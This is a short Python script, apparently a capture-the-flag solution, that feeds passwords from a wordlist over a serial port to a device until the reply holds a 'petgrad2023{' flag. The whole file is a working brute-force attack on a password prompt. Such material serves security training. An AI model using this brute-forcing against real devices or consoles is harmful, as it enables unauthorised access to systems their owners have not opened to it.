import serial
import time

# Serial port configuration
PORT = 'COM7'  # This will vary based on OS and connection view in device manager
BAUD_RATE = 9600 # the baud rate
TIMEOUT = 1  # Adjust based on the Arduino's response time

# Load the wordlist
with open('./passwords.txt', 'r') as f:
    passwords = [line.strip() for line in f]

# Open the serial connection
with serial.Serial(PORT, BAUD_RATE, timeout=TIMEOUT) as ser:
    # Give some time for the connection to establish
    time.sleep(2)

    # Wait for the "Booting........." output
    while True:
        response = ser.readline().decode('utf-8').strip()
        time.sleep(2)
        print(f"Received: {response}")
        if "Booting........." in response:
            break

    # Now proceed with the brute force
    for password in passwords:
        print(f"Trying: {password}")
        
        # Send the password followed by a newline to simulate Enter key press
        ser.write((password + '\n').encode('utf-8'))
        time.sleep(2)

        # Wait for a response
        response = ser.readline().decode('utf-8').strip()
        time.sleep(2)
        print(f"Received: {response}")

        # Check the response for the specific flag pattern
        if "petgrad2023{" in response:
            print(f"Flag found with password '{password}': {response}")
            break

print("Brute force finished.")
